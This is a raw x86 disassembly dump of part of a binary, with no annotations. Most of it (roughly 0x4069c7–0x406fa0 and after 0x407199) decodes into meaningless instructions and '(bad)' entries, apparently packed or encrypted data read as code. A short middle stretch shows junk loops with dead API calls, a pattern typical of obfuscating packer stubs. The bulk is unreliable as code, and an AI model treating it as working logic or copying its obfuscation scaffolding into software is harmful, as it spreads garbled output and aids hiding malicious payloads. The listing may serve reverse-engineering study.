  4069c7:	in     al,0x1e
  4069c9:	push   edi
  4069ca:	push   edx
  4069cb:	psrld  mm2,QWORD PTR [eax]
  4069ce:	cwde   
  4069cf:	cmp    DWORD PTR [eax+ebp*4-0x64],0x90951c60
  4069d7:	das    
  4069d8:	out    dx,al
  4069d9:	ret    0x96b2
  4069dc:	stos   BYTE PTR es:[edi],al
  4069dd:	imul   ebp,DWORD PTR [ecx+0x1b],0x57d40178
  4069e4:	nop
  4069e5:	cmp    ebx,DWORD PTR [ecx+0x5a7e7914]
  4069eb:	out    dx,eax
  4069ec:	jae    0x4069ba
  4069ee:	aaa    
  4069ef:	not    DWORD PTR [edx+0x551383b9]
  4069f5:	mov    bh,0xba
  4069f7:	ret    0xd506
  4069fa:	push   esp
  4069fb:	sti    
  4069fc:	stos   BYTE PTR es:[edi],al
  4069fd:	out    dx,eax
  4069fe:	lahf   
  4069ff:	cmp    edi,esi
  406a01:	mov    eax,0xe19f71c9
  406a06:	jmp    0x8ea4595d
  406a0b:	std    
  406a0c:	and    al,BYTE PTR [edx]
  406a0e:	adc    BYTE PTR [ecx],bl
  406a10:	pop    ebp
  406a11:	mov    dh,0x21
  406a13:	xchg   edx,eax
  406a14:	mov    al,0xc6
  406a16:	mov    ah,0xcb
  406a18:	xchg   DWORD PTR [edx+0x51],edx
  406a1b:	loopne 0x406a4d
  406a1d:	frstor [edx]
  406a1f:	pusha  
  406a20:	in     eax,0x29
  406a22:	and    bh,BYTE PTR ds:0xa033329c
  406a28:	clc    
  406a29:	jge    0x406a96
  406a2b:	call   0xe5cc7f0e
  406a30:	mov    cl,0x74
  406a32:	aam    0x49
  406a34:	xlat   BYTE PTR ds:[ebx]
  406a35:	jns    0x406a16
  406a37:	sub    eax,0xb004b46e
  406a3c:	aam    0x14
  406a3e:	in     al,dx
  406a3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a40:	out    dx,eax
  406a41:	add    DWORD PTR [ebx],ebp
  406a43:	mov    ch,0xe
  406a45:	sbb    al,0x12
  406a47:	adc    al,0x4e
  406a49:	add    DWORD PTR [edx-0x30809d3a],esp
  406a4f:	in     eax,0xa5
  406a51:	sub    al,0x3f
  406a53:	loopne 0x406a31
  406a55:	and    ebx,DWORD PTR [edx-0x4454aa42]
  406a5b:	std    
  406a5c:	sbb    edx,DWORD PTR [ebx]
  406a5e:	fstp   QWORD PTR [eax]
  406a60:	scas   al,BYTE PTR es:[edi]
  406a61:	outs   dx,BYTE PTR ds:[esi]
  406a62:	js     0x406ad4
  406a64:	fcmovnu st,st(6)
  406a66:	imul   edx
  406a68:	lahf   
  406a69:	mov    esi,0x3fc1be52
  406a6e:	maskmovq mm1,(bad)
  406a6f:	test   DWORD PTR [ebp+0x25d66e3c],0x21d2c451
  406a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7a:	pop    DWORD PTR [esi+ebp*4-0x720518f3]
  406a81:	sub    bl,cl
  406a83:	shl    ebx,cl
  406a85:	in     eax,0x9d
  406a87:	mov    esi,0x44196523
  406a8c:	les    esi,FWORD PTR [edx-0x6e]
  406a8f:	xchg   DWORD PTR [ebx],esp
  406a91:	xchg   ecx,eax
  406a92:	aad    0x7e
  406a94:	cdq    
  406a95:	test   DWORD PTR [edx+0x458cdd58],0x797561e3
  406a9f:	inc    esp
  406aa0:	dec    esi
  406aa1:	arpl   WORD PTR [eax-0x5be29d69],sp
  406aa7:	mov    ds:0x3ad516d6,al
  406aac:	jg     0x406a37
  406aae:	imul   ebp,DWORD PTR [eax+0x3e20aeeb],0xef826d1e
  406ab8:	mov    ebp,cs
  406aba:	outs   dx,DWORD PTR ds:[esi]
  406abb:	es stos DWORD PTR es:[edi],eax
  406abd:	add    DWORD PTR ds:0xdb06da9b,ecx
  406ac3:	adc    al,0xab
  406ac5:	mov    dl,0x90
  406ac7:	mov    ?,WORD PTR [edx-0x30b2c7ac]
  406acd:	repnz (bad) [edx+ebp*8+0x2a]
  406ad2:	stc    
  406ad3:	sub    ch,BYTE PTR ss:[edi+0x38e30a61]
  406ada:	jle    0x406abd
  406adc:	js     0x406a9e
  406ade:	sbb    dl,BYTE PTR [ebx-0x7f]
  406ae1:	hlt    
  406ae2:	jo     0x406b42
  406ae4:	add    dh,ah
  406ae6:	jmp    0x406add
  406ae8:	dec    edi
  406ae9:	sahf   
  406aea:	xor    edx,ecx
  406aec:	(bad)  
  406aed:	mov    bh,0x62
  406aef:	adc    eax,eax
  406af1:	test   ebp,ecx
  406af3:	add    ecx,DWORD PTR [ebp+0x66b9b2ff]
  406af9:	(bad)  
  406afa:	mov    edi,0xdb01c5ad
  406aff:	xor    bh,BYTE PTR [eax-0x4f]
  406b02:	jg     0x406aa3
  406b04:	into   
  406b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b06:	cmp    BYTE PTR [edx-0xc],ah
  406b09:	xor    bl,BYTE PTR [esi-0x14]
  406b0c:	xchg   edx,eax
  406b0d:	inc    eax
  406b0e:	jmp    0x406b38
  406b10:	ds mov cl,0xb4
  406b13:	xor    eax,0xcbe4ac3d
  406b18:	mov    ch,0x91
  406b1a:	adc    DWORD PTR [ecx-0x5d515a33],eax
  406b20:	xor    eax,0xf94de340
  406b25:	sub    al,0x52
  406b27:	retf   
  406b28:	xor    BYTE PTR [edx+0x6bde3bce],0xa
  406b2f:	jno    0x406afb
  406b31:	dec    ebx
  406b32:	es call 0x244f:0x23eab92c
  406b3a:	push   ebp
  406b3b:	je     0x406bb3
  406b3d:	int    0x49
  406b3f:	call   DWORD PTR [ecx+0x61]
  406b42:	mov    ebp,0xc9f5a6ea
  406b47:	push   edi
  406b48:	imul   edi,edx,0x36
  406b4b:	es call 0x20ac74dd
  406b51:	mov    edx,0xc69c3c16
  406b56:	leave  
  406b57:	or     DWORD PTR [eax+0x9],edx
  406b5a:	sub    dh,BYTE PTR [edx]
  406b5c:	push   cs
  406b5d:	mov    cl,dl
  406b5f:	fmul   QWORD PTR [edi]
  406b61:	jae    0x406ba3
  406b63:	(bad)  
  406b64:	idiv   DWORD PTR [edx-0x72]
  406b67:	cdq    
  406b68:	push   edi
  406b69:	push   ss
  406b6a:	stos   BYTE PTR es:[edi],al
  406b6b:	sub    BYTE PTR ds:0xebe67b7a,ah
  406b71:	jp     0x406b78
  406b73:	test   eax,0x71cfdd11
  406b78:	and    BYTE PTR [esi],bh
  406b7a:	jecxz  0x406b37
  406b7c:	mov    edx,0x2e618d63
  406b81:	and    bh,BYTE PTR [ecx+0x2310c2e5]
  406b87:	fisub  DWORD PTR [ebp+ebx*4-0x41]
  406b8b:	jb     0x406c0b
  406b8d:	stc    
  406b8e:	leave  
  406b8f:	mov    esp,0x1d8cff73
  406b94:	push   cs
  406b95:	sub    eax,0x54356fb5
  406b9a:	cdq    
  406b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b9d:	ins    DWORD PTR es:[edi],dx
  406b9e:	push   es
  406b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ba0:	and    dh,BYTE PTR [ecx]
  406ba2:	jns    0x406bd1
  406ba4:	mov    eax,ds:0x209aebcc
  406ba9:	lods   al,BYTE PTR ds:[esi]
  406baa:	sbb    BYTE PTR [edx-0x238bb93],cl
  406bb0:	inc    edi
  406bb1:	cmp    dh,BYTE PTR [esp+eiz*4]
  406bb4:	jle    0x406bf2
  406bb6:	jbe    0x406bba
  406bb8:	in     al,dx
  406bb9:	jns    0x406c26
  406bbb:	mov    eax,ds:0xa48f80d8
  406bc0:	pop    ecx
  406bc1:	test   edx,ebp
  406bc3:	push   ecx
  406bc4:	lea    esi,[ebp+0x8]
  406bc7:	fwait
  406bc8:	repnz jecxz 0x406c15
  406bcb:	mov    WORD PTR [ebp+0x6d3fdb6],gs
  406bd1:	xor    ah,0x2f
  406bd4:	sub    eax,0x63827c24
  406bd9:	inc    edi
  406bda:	stos   DWORD PTR es:[edi],eax
  406bdb:	push   ecx
  406bdc:	cwde   
  406bdd:	or     dh,al
  406bdf:	and    al,0x65
  406be1:	add    al,BYTE PTR [eax-0x3d]
  406be4:	shl    DWORD PTR [ebp-0xc],cl
  406be7:	jbe    0x406b85
  406be9:	(bad)  
  406beb:	mov    cl,0x84
  406bed:	scas   eax,DWORD PTR es:[edi]
  406bee:	(bad)  
  406bef:	daa    
  406bf0:	std    
  406bf1:	iret   
  406bf2:	rol    ebx,0x63
  406bf5:	mov    cl,0x61
  406bf7:	test   DWORD PTR [esp+ebp*8+0x24f1be93],esp
  406bfe:	jg     0x406bac
  406c00:	dec    BYTE PTR [ebp+0x45]
  406c03:	ret    0x3007
  406c06:	sar    DWORD PTR [esi-0x7c08cdf8],0xa3
  406c0d:	and    al,0x22
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	mov    eax,ds:0x384c78e4
  406c2c:	retf   0x7e7e
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	aam    0xd0
  406c35:	iret   
  406c36:	push   ss
  406c37:	jno    0x406c59
  406c39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c3a:	mov    al,0x42
  406c3c:	sub    eax,0x433793f9
  406c41:	in     eax,0x3c
  406c43:	jo     0x406c09
  406c45:	xchg   ebp,eax
  406c46:	into   
  406c47:	xor    ebp,edx
  406c49:	lods   eax,DWORD PTR ds:[esi]
  406c4a:	and    eax,0x769a715e
  406c4f:	scas   al,BYTE PTR es:[edi]
  406c50:	outs   dx,BYTE PTR ds:[esi]
  406c51:	jns    0x406c19
  406c53:	pop    ds
  406c54:	cmp    ebp,DWORD PTR [esi-0x44f2d5f5]
  406c5a:	push   edi
  406c5b:	push   cs
  406c5c:	ficomp DWORD PTR [ecx]
  406c5e:	aad    0x56
  406c60:	cmp    DWORD PTR [ebx+0x56],edi
  406c63:	push   ebp
  406c64:	cs std 
  406c66:	dec    esi
  406c67:	add    BYTE PTR [eax],bh
  406c69:	rcl    DWORD PTR [ebp+ecx*8-0x78bd7bb6],cl
  406c70:	jmp    0xb527f1ad
  406c75:	add    bh,BYTE PTR [ecx+0x7f]
  406c78:	xchg   ebp,eax
  406c79:	xor    eax,0x5550a17d
  406c7e:	xor    BYTE PTR [ebp-0xe3bcf42],al
  406c84:	lock out dx,al
  406c86:	dec    ecx
  406c87:	push   0x471d10e7
  406c8c:	or     ah,bh
  406c8e:	dec    ecx
  406c8f:	push   edi
  406c90:	cmp    al,0xc3
  406c92:	popf   
  406c93:	push   ecx
  406c94:	dec    ebx
  406c95:	dec    esi
  406c96:	bound  edx,QWORD PTR [ebx+0x33d9e510]
  406c9c:	lods   al,BYTE PTR ds:[esi]
  406c9d:	or     DWORD PTR [ecx],esi
  406c9f:	push   edi
  406ca0:	js     0x406c65
  406ca2:	or     cl,BYTE PTR [eax+edi*1-0x5e]
  406ca6:	sub    dh,0x6a
  406ca9:	enter  0xba7a,0x7f
  406cad:	dec    edi
  406cae:	call   0xacd1:0x9f8f9498
  406cb5:	push   esp
  406cb6:	or     al,0x75
  406cb8:	push   esi
  406cb9:	std    
  406cba:	jo     0x406cb2
  406cbc:	fsub   DWORD PTR [esi+edx*1+0x1f]
  406cc0:	(bad)  
  406cc1:	jmp    0x406c71
  406cc3:	test   bh,bh
  406cc5:	jmp    0x25494525
  406cca:	test   al,0xe4
  406ccc:	lea    ebx,[edx-0x33]
  406ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd0:	xchg   edx,eax
  406cd1:	xchg   ebp,eax
  406cd2:	add    al,0x91
  406cd4:	bound  ebp,QWORD PTR [eax+0x1c]
  406cd7:	mov    BYTE PTR [ebp+0x2c2c50b8],bh
  406cdd:	jl     0x406d45
  406cdf:	shl    BYTE PTR [ebx+0x712f4f0c],0x86
  406ce6:	outs   dx,DWORD PTR ds:[esi]
  406ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce8:	cli    
  406ce9:	dec    eax
  406cea:	mov    ds:0xbea4db8a,al
  406cef:	pop    ecx
  406cf0:	fnop   
  406cf2:	sub    eax,esp
  406cf4:	inc    edi
  406cf5:	or     DWORD PTR [edx+esi*4-0x1d7cec1e],ebp
  406cfc:	es mov ah,0xd1
  406cff:	mov    ebp,0x377bd15f
  406d04:	fwait
  406d05:	jne    0x406d27
  406d07:	arpl   ax,bp
  406d09:	xlat   BYTE PTR ds:[ebx]
  406d0a:	aad    0xce
  406d0c:	jge    0x406c9f
  406d0e:	mov    al,0x80
  406d10:	mov    cs,WORD PTR [ecx]
  406d12:	iret   
  406d13:	(bad)  
  406d14:	jmp    0x10918233
  406d19:	std    
  406d1a:	push   ds
  406d1b:	sub    DWORD PTR [esi-0x20],ebp
  406d1e:	adc    esp,DWORD PTR [edx]
  406d20:	mov    bh,BYTE PTR [edx]
  406d22:	jns    0x406d1d
  406d24:	push   cs
  406d25:	dec    ebp
  406d26:	gs std 
  406d28:	ins    BYTE PTR es:[edi],dx
  406d29:	daa    
  406d2a:	in     eax,dx
  406d2b:	mov    cl,0x38
  406d2d:	les    esp,FWORD PTR [eax+0xbfef4c5]
  406d33:	cwde   
  406d34:	mov    eax,0xdf1326de
  406d39:	xor    al,0xef
  406d3b:	add    eax,0xabf50191
  406d40:	mov    ds:0x4bf4e8a,al
  406d45:	ret    0x6c2c
  406d48:	add    ebx,ecx
  406d4a:	lds    eax,FWORD PTR [edi-0x75]
  406d4d:	clc    
  406d4e:	aas    
  406d4f:	cwde   
  406d50:	repz adc al,0x75
  406d53:	fsubrp st(4),st
  406d55:	dec    esi
  406d56:	mov    esp,0xa74cd50e
  406d5b:	inc    esi
  406d5c:	add    BYTE PTR [edi],cl
  406d5e:	div    ah
  406d60:	popa   
  406d61:	in     eax,dx
  406d62:	(bad)  
  406d63:	cwde   
  406d64:	fwait
  406d65:	test   al,dl
  406d67:	out    dx,al
  406d68:	pop    ds
  406d69:	scas   eax,DWORD PTR es:[edi]
  406d6a:	retf   0xabde
  406d6d:	arpl   WORD PTR [ebp-0x29],cx
  406d70:	leave  
  406d71:	jle    0x406d55
  406d73:	jo     0x406d3b
  406d75:	add    eax,0xc967dd0e
  406d7a:	and    esp,DWORD PTR [ebx-0xf20e7]
  406d80:	push   0x7e71f3ff
  406d85:	shl    ebx,1
  406d87:	push   esi
  406d88:	es fxch st(5)
  406d8b:	mov    cl,0xc9
  406d8d:	mov    ah,0x42
  406d8f:	fnstcw WORD PTR [eax]
  406d91:	pop    es
  406d92:	mov    cl,0x94
  406d94:	push   cs
  406d95:	int3   
  406d96:	adc    eax,0x326b406b
  406d9b:	fisttp DWORD PTR [edx-0x23]
  406d9e:	mov    al,ds:0x84f5971e
  406da3:	add    cl,bl
  406da5:	test   BYTE PTR [eax-0x14],ah
  406da8:	jecxz  0x406d2a
  406daa:	add    BYTE PTR [edx],0xa2
  406dad:	dec    esp
  406dae:	jge    0x406d8f
  406db0:	mov    ds:0x2e95ad93,eax
  406db5:	cmp    eax,0x2466fa4f
  406dba:	or     esi,DWORD PTR [eax+eax*8]
  406dbd:	stc    
  406dbe:	aam    0xe9
  406dc0:	mov    BYTE PTR [eax+0x67f23a5],al
  406dc6:	jmp    0x36b9119e
  406dcb:	retf   
  406dcc:	pop    ss
  406dcd:	push   eax
  406dce:	nop
  406dcf:	hlt    
  406dd0:	ins    BYTE PTR es:[edi],dx
  406dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dd2:	mov    cl,0x44
  406dd4:	imul   edi,DWORD PTR fs:[ebp-0x38],0x38
  406dd9:	adc    BYTE PTR [eax-0x7c],ch
  406ddc:	call   0x2701:0x277021bb
  406de3:	jbe    0x406e1e
  406de5:	lock nop
  406de7:	jl     0x406d7b
  406de9:	sub    cl,dl
  406deb:	sbb    al,0x5d
  406ded:	xor    BYTE PTR [ecx],ch
  406def:	jne    0x406e28
  406df1:	imul   ebx,DWORD PTR [ebx-0x53],0xe6b7de70
  406df8:	lea    ebx,cs:[eax-0x3]
  406dfc:	inc    edx
  406dfd:	push   ds
  406dfe:	dec    ebx
  406dff:	pop    esp
  406e00:	xlat   BYTE PTR ds:[ebx]
  406e01:	push   ecx
  406e02:	jae    0x406df0
  406e04:	sbb    BYTE PTR [ecx],dh
  406e06:	mov    edi,0x108d1573
  406e0b:	retf   
  406e0c:	mov    ds:0xdbc1f20c,eax
  406e11:	icebp  
  406e12:	test   DWORD PTR [edi],edx
  406e14:	sub    cl,BYTE PTR [eax-0x2415322a]
  406e1a:	xchg   esp,eax
  406e1b:	push   ss
  406e1c:	mov    bl,0xea
  406e1e:	pop    ebp
  406e1f:	dec    eax
  406e20:	xchg   BYTE PTR [eax-0x1dee5b88],dh
  406e26:	fwait
  406e27:	xor    al,0x8
  406e29:	sub    DWORD PTR [ebx],esi
  406e2b:	cs cmc 
  406e2d:	in     al,dx
  406e2e:	jns    0x406dc7
  406e30:	inc    ebx
  406e31:	ins    BYTE PTR es:[edi],dx
  406e32:	or     DWORD PTR [ecx],esp
  406e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e35:	pop    edx
  406e36:	push   es
  406e37:	retf   
  406e38:	aam    0x13
  406e3a:	cmp    al,0x49
  406e3c:	or     al,0xaf
  406e3e:	xlat   BYTE PTR ds:[ebx]
  406e3f:	rcl    BYTE PTR [eax-0x19],cl
  406e42:	pop    eax
  406e43:	jnp    0x406df6
  406e45:	call   DWORD PTR [edi+0x5af469df]
  406e4b:	jg     0x406e4a
  406e4d:	adc    eax,0xa7840f03
  406e52:	stos   BYTE PTR es:[edi],al
  406e53:	sub    BYTE PTR [edi+edx*2-0x510d79d6],al
  406e5a:	daa    
  406e5b:	dec    ebx
  406e5c:	in     eax,dx
  406e5d:	and    DWORD PTR ds:0xbaaf6d51,ecx
  406e63:	int    0x3d
  406e65:	xchg   edx,eax
  406e66:	loope  0x406e04
  406e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e69:	mov    ebx,edx
  406e6b:	stos   BYTE PTR es:[edi],al
  406e6c:	fnsetpm(287 only) 
  406e6e:	repnz inc esp
  406e70:	push   ebp
  406e71:	fistp  QWORD PTR [esi+0x5f]
  406e74:	adc    DWORD PTR ds:0x241929a3,eax
  406e7a:	and    DWORD PTR [edi],ebx
  406e7c:	loope  0x406e92
  406e7e:	push   ebp
  406e7f:	cs cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  406e82:	jge    0x406e06
  406e84:	mov    edi,DWORD PTR [edx]
  406e86:	push   eax
  406e87:	add    bl,bh
  406e89:	popa   
  406e8a:	mov    edi,0xd9da8bb7
  406e8f:	outs   dx,BYTE PTR ds:[esi]
  406e90:	rcr    BYTE PTR [ebp+0x1525934e],cl
  406e96:	push   0x10348c5c
  406e9b:	fwait
  406e9c:	cmp    sp,WORD PTR [edx-0x3273414f]
  406ea3:	mov    ebp,0x63f7d97a
  406ea8:	jg     0x406eec
  406eaa:	rol    BYTE PTR cs:[ebx+0x75],1
  406eae:	loop   0x406f18
  406eb0:	sbb    al,0x98
  406eb2:	cs out 0x2d,eax
  406eb5:	ss add eax,0x8bd806df
  406ebb:	je     0x406ebb
  406ebd:	mov    bh,0x4b
  406ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ec0:	popf   
  406ec1:	test   DWORD PTR [ecx+0x7df1331f],ebx
  406ec7:	mov    ah,0xd5
  406ec9:	out    0x7b,al
  406ecb:	adc    eax,0x8ee76608
  406ed0:	sbb    edx,esp
  406ed2:	and    ch,dl
  406ed4:	imul   eax,ecx,0x9906ebf
  406eda:	xchg   ecx,eax
  406edb:	shl    DWORD PTR [esi+ebx*8-0x188a8c35],cl
  406ee2:	jl     0x406e8c
  406ee4:	xchg   al,ch
  406ee6:	sbb    eax,0x2ca7a95a
  406eeb:	jl     0x406ec4
  406eed:	ins    DWORD PTR es:[edi],dx
  406eee:	mov    ss,WORD PTR [esi-0x7e7904d9]
  406ef4:	and    al,0x7a
  406ef6:	mul    DWORD PTR [eax-0x53]
  406ef9:	cmp    al,0x4b
  406efb:	sahf   
  406efc:	scas   al,BYTE PTR es:[edi]
  406efd:	cdq    
  406efe:	xchg   esp,eax
  406eff:	push   edi
  406f00:	push   ecx
  406f01:	push   edi
  406f02:	xor    BYTE PTR [esi-0x5a90bdac],ch
  406f08:	in     eax,dx
  406f09:	repz sbb BYTE PTR [esi-0x50],dl
  406f0d:	sbb    eax,0x73045c0f
  406f12:	mov    bl,0x2d
  406f14:	fwait
  406f15:	pop    eax
  406f16:	and    al,0xa4
  406f18:	(bad)
  406f1b:	retf   0x5241
  406f1e:	jecxz  0x406eeb
  406f20:	inc    eax
  406f21:	xchg   BYTE PTR [edx],ch
  406f23:	mov    ah,0xe2
  406f25:	ins    DWORD PTR es:[edi],dx
  406f26:	cmp    al,0x73
  406f28:	add    DWORD PTR [ebp-0x1f],edx
  406f2b:	push   esp
  406f2c:	aad    0x68
  406f2e:	adc    DWORD PTR [ecx+0x2d0f1053],0x22
  406f35:	es dec ecx
  406f37:	fsubr  st,st(0)
  406f39:	dec    edx
  406f3a:	xchg   ecx,eax
  406f3b:	fwait
  406f3c:	jmp    0x70382ee8
  406f41:	dec    esi
  406f42:	scas   eax,DWORD PTR es:[edi]
  406f43:	test   DWORD PTR [edi],ecx
  406f45:	mov    esp,0x40f7d9d2
  406f4a:	pop    ebx
  406f4b:	dec    eax
  406f4c:	pop    ds
  406f4d:	ret    0x9aa5
  406f50:	xchg   DWORD PTR [esi],ebx
  406f52:	repz or DWORD PTR [eax-0x56eea51],0x58
  406f5a:	add    DWORD PTR [eax],esp
  406f5c:	or     DWORD PTR ds:0xc734598b,edi
  406f62:	out    dx,al
  406f63:	ins    BYTE PTR es:[edi],dx
  406f64:	and    BYTE PTR [ebx+0x3879c621],0xf2
  406f6b:	bound  ecx,QWORD PTR [eax]
  406f6d:	xchg   ebp,eax
  406f6e:	sbb    ah,dl
  406f70:	jo     0x406fb6
  406f72:	mov    eax,0x150715a7
  406f77:	mov    esi,0xed46b5ff
  406f7c:	into   
  406f7d:	mov    ecx,0xdb9dd6c6
  406f82:	test   BYTE PTR [eax],0x99
  406f85:	xor    DWORD PTR [ebp-0x638f8d87],0x46935179
  406f8f:	nop
  406f90:	jecxz  0x406f9b
  406f92:	mov    WORD PTR [esi+ebp*1-0x4c],?
  406f96:	jl     0x406f2b
  406f98:	mov    dl,0xcc
  406f9a:	fwait
  406f9b:	add    al,0x93
  406f9d:	mov    ebx,0xc2030d62
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430596,0x19
  406fd8:	cmp    DWORD PTR ds:0x430596,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430596,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42ebc4
  406ffd:	cmp    DWORD PTR ds:0x430596,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430596
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430596,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430596
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430596,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430656,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43064a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ef18,0x42ef20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ef10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ef1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ef1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ef1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ef1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eca4
  4070a9:	cmp    DWORD PTR ds:0x42ef1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ef1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ef1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ef1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43065a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ef28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ef28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ef28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ef28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ef28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ef24
  407123:	call   DWORD PTR ds:0x42eca8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4305ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430592,0x17
  407147:	cmp    DWORD PTR ds:0x430592,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430592,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42eb04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430592
  407179:	dec    eax
  40717a:	mov    ds:0x430592,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x1779b8b
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x40714f
  4071b2:	stos   BYTE PTR es:[edi],al
  4071b3:	cmp    BYTE PTR [ecx],ch
  4071b5:	sub    DWORD PTR [edi],edx
  4071b7:	fidivr DWORD PTR [edi-0x381b459b]
  4071bd:	cmp    eax,0x1fa058e3
  4071c2:	js     0x4071eb
  4071c4:	loopne 0x4071fd
  4071c6:	dec    edx
  4071c7:	mov    bh,dl
  4071c9:	shr    BYTE PTR [ebx+edx*2+0x632943e0],cl
  4071d0:	hlt    
  4071d1:	mov    bh,0x33
  4071d3:	ja     0x407238
  4071d5:	in     eax,dx
  4071d6:	pop    edx
  4071d7:	popa   
  4071d8:	pusha  
  4071d9:	jle    0x407222
  4071db:	mov    BYTE PTR [ecx-0x67],0xae
  4071df:	sbb    eax,0xecbb6120
  4071e4:	aad    0xe
  4071e6:	push   0x5d
  4071e8:	mov    edi,DWORD PTR [edi]
  4071ea:	adc    eax,0x591aad91
  4071ef:	popf   
  4071f0:	jp     0x4071c6
  4071f2:	sub    BYTE PTR [edx-0x31e66c70],0x98
  4071f9:	cmp    BYTE PTR [edi-0x6c378986],cl
  4071ff:	hlt    
  407200:	je     0x4071b5
  407202:	bound  ebp,QWORD PTR [ebp+0x43d5532d]
  407208:	enter  0x2214,0x4e
  40720c:	dec    eax
  40720d:	jl     0x407192
  40720f:	push   ss
  407210:	sub    DWORD PTR [ebx-0x4a],ecx
  407213:	lea    edi,[eax+0x2f]
  407216:	mov    bl,0xc9
  407218:	dec    edi
  407219:	(bad)  
  40721b:	mov    esp,0x308467fe
  407220:	test   bh,bl
  407222:	pop    esp
  407223:	lock dec esp
  407225:	mov    bl,0xa1
  407227:	loopne 0x407271
  407229:	in     eax,0xc8
  40722b:	leave  
  40722c:	pop    ds
  40722d:	mov    al,0x18
  40722f:	mov    al,0x8c
  407231:	(bad)  
  407232:	xor    al,0x94
